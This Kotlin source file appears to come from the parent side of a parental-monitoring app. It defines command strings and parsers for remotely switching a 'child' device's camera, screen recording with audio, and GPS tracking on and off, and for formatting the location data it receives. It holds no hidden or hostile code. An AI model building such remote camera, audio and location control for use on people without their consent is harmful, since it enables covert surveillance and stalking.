package com.nexus.parent.data

import com.nexus.parent.state.CameraLens
import com.nexus.parent.state.ScreenQuality
import org.json.JSONObject
import java.util.Locale
import kotlin.math.abs

/**
 * LocationUpdatePacket - Parsed geolocation telemetry emitted by Child's `LocationCommandHandler`.
 */
data class LocationUpdatePacket(
    val latitude: Double,
    val longitude: Double,
    val accuracyMeters: Float,
    val altitudeMeters: Double,
    val speedMps: Float,
    val bearingDegrees: Float,
    val timestampMs: Long
)

/**
 * SurveillanceProtocols.kt - DataChannel command builders, response matchers, and telemetry
 * formatters shared across Camera, Screen, and Location controllers (matching Desktop `types.ts` 1:1).
 */
object SurveillanceProtocols {

    // Camera commands & confirmations
    const val CMD_CAMERA_ON = "CAMERA_ON"
    const val CMD_CAMERA_OFF = "CAMERA_OFF"
    const val CMD_CAMERA_SWITCH = "CAMERA_SWITCH"
    const val RESP_CAMERA_STARTED = "CAMERA_STARTED"
    const val RESP_CAMERA_STOPPED = "CAMERA_STOPPED"
    const val RESP_CAMERA_SWITCHED_PREFIX = "CAMERA_SWITCHED"
    const val RESP_CAMERA_ERROR_PREFIX = "CAMERA_ERROR:"

    // Screen commands, confirmations & audio stream header
    const val CMD_SCREEN_ON = "SCREEN_ON"
    const val CMD_SCREEN_OFF = "SCREEN_OFF"
    const val CMD_SCREEN_QUALITY_PREFIX = "SCREEN_QUALITY:"
    const val RESP_SCREEN_STARTED = "SCREEN_STARTED"
    const val RESP_SCREEN_RECORDING_STARTED = "SCREEN_RECORDING_STARTED"
    const val RESP_SCREEN_STOPPED = "SCREEN_STOPPED"
    const val RESP_SCREEN_RECORDING_STOPPED = "SCREEN_RECORDING_STOPPED"
    const val RESP_SCREEN_QUALITY_SET_PREFIX = "SCREEN_QUALITY_SET:"
    const val RESP_SCREEN_ERROR_PREFIX = "SCREEN_ERROR:"
    const val HEADER_OPUS_AUDIO = "OPUS_AUDIO:"

    // Location commands, confirmations & packet identifier
    const val CMD_LOCATION_ON = "LOCATION_ON"
    const val CMD_LOCATION_OFF = "LOCATION_OFF"
    const val RESP_LOCATION_STARTED = "LOCATION_STARTED"
    const val RESP_LOCATION_STOPPED = "LOCATION_STOPPED"
    const val RESP_LOCATION_ERROR_PREFIX = "LOCATION_ERROR:"
    const val TYPE_LOCATION_UPDATE = "LOCATION_UPDATE"

    const val COMMAND_CONFIRMATION_TIMEOUT_MS = 20_000L

    fun buildCameraOnCommand(lens: CameraLens): String {
        val tag = if (lens == CameraLens.FRONT) "FRONT" else "REAR"
        return "$CMD_CAMERA_ON:$tag"
    }

    fun parseCameraSwitchedLens(message: String, fallbackCurrent: CameraLens): CameraLens {
        val parts = message.split(':')
        if (parts.size > 1) {
            val normalized = parts[1].trim().uppercase(Locale.US)
            return if (normalized == "FRONT") CameraLens.FRONT else CameraLens.REAR
        }
        return if (fallbackCurrent == CameraLens.REAR) CameraLens.FRONT else CameraLens.REAR
    }

    fun buildScreenOnCommand(quality: ScreenQuality): String {
        return "$CMD_SCREEN_ON:${quality.label}"
    }

    fun buildScreenQualityCommand(quality: ScreenQuality): String {
        return "$CMD_SCREEN_QUALITY_PREFIX${quality.label}"
    }

    fun parseLocationPacket(rawMessage: String): LocationUpdatePacket? {
        val trimmed = rawMessage.trim()
        if (!trimmed.startsWith("{") || !trimmed.endsWith("}")) return null

        return runCatching {
            val json = JSONObject(trimmed)
            if (json.optString("type") != TYPE_LOCATION_UPDATE) return null

            val coordsArr = json.optJSONArray("coords")
            val lat = when {
                json.has("latitude") && !json.isNull("latitude") -> json.getDouble("latitude")
                coordsArr != null && coordsArr.length() >= 2 -> coordsArr.getDouble(0)
                else -> Double.NaN
            }
            val lng = when {
                json.has("longitude") && !json.isNull("longitude") -> json.getDouble("longitude")
                coordsArr != null && coordsArr.length() >= 2 -> coordsArr.getDouble(1)
                else -> Double.NaN
            }
            if (lat.isNaN() || lng.isNaN()) return null

            LocationUpdatePacket(
                latitude = lat,
                longitude = lng,
                accuracyMeters = json.optDouble("accuracy", 10.0).toFloat(),
                altitudeMeters = json.optDouble("altitude", 0.0),
                speedMps = json.optDouble("speed", 0.0).toFloat(),
                bearingDegrees = json.optDouble("bearing", 0.0).toFloat(),
                timestampMs = json.optLong("timestamp", System.currentTimeMillis())
            )
        }.getOrNull()
    }

    fun formatCoordinates(lat: Double, lng: Double): String {
        val latDir = if (lat >= 0.0) "N" else "S"
        val lngDir = if (lng >= 0.0) "E" else "W"
        return String.format(Locale.US, "%.6f° %s, %.6f° %s", abs(lat), latDir, abs(lng), lngDir)
    }

    fun formatSpeed(speedMps: Float): String {
        if (speedMps <= 0.2f) return "0.0 km/h (Stationary)"
        val kmh = speedMps * 3.6f
        return String.format(Locale.US, "%.1f km/h", kmh)
    }

    fun formatAccuracy(accuracyMeters: Float): String {
        if (accuracyMeters <= 0f) return "±0 m (High Precision)"
        return String.format(Locale.US, "±%.1f m", accuracyMeters)
    }

    fun formatRelativeTime(timestampMs: Long, nowMs: Long = System.currentTimeMillis()): String {
        val diffSec = ((nowMs - timestampMs) / 1000L).coerceAtLeast(0L)
        return when {
            diffSec < 2L -> "Just now"
            diffSec < 60L -> "$diffSec seconds ago"
            diffSec < 3600L -> "${diffSec / 60L}m ago"
            else -> "${diffSec / 3600L}h ago"
        }
    }

    fun formatElapsedSeconds(totalSeconds: Int): String {
        val clamped = totalSeconds.coerceAtLeast(0)
        val hrs = clamped / 3600
        val mins = (clamped % 3600) / 60
        val secs = clamped % 60
        return if (hrs > 0) {
            String.format(Locale.US, "%02d:%02d:%02d", hrs, mins, secs)
        } else {
            String.format(Locale.US, "%02d:%02d", mins, secs)
        }
    }
}
